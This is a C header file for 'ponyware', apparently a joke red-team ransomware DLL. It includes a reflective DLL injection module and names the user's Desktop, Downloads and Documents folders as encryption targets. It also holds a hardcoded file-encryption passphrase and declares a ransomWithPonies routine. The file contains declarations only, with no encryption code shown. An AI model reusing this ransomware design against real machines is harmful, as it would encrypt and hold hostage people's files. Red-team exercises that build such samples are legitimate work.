#ifndef PONYWAREDLL_H
#define PONYWAREDLL_H

#include <stdlib.h>
#include <Windows.h>

#include "resource.h"
#include "../common/winUtils.h"
#include "../common/stringList.h"
#include "../common/fileCrypt.h"
#include "../common/ReflectiveDLLInjection/dll/src/ReflectiveDLLInjection.h"

// length of filenames in project to not encrypt
#define SELF_FILENAME_LENGTH 14

// filenames to not encrypt
static const TCHAR *launcher = L"paythepony.exe";
static const TCHAR *myDll32  = L"ponyware32.dll";
static const TCHAR *myDll64  = L"ponyware64.dll";

// directories to encrypt with ponyware
static const TCHAR *targetDir01 = L"%HOMEPATH%\\Desktop";
static const TCHAR *targetDir02 = L"%HOMEPATH%\\Downloads";
static const TCHAR *targetDir03 = L"%HOMEPATH%\\Documents";
static const TCHAR *targetDir04 = L"%HOMEPATH%\\My Documents";

// extension to give files encrypted with ponyware
static const TCHAR *encryptedFileExt = L".exe";

// passphrase used to encrypt files with
static const char *encryptFilePass = "Red Team Is Winning!";

extern __declspec(dllexport) BOOL PonyMane(void);
void setVolumeToMax();
void singPonies();
void ransomWithPonies();

#endif // PONYWAREDLL_H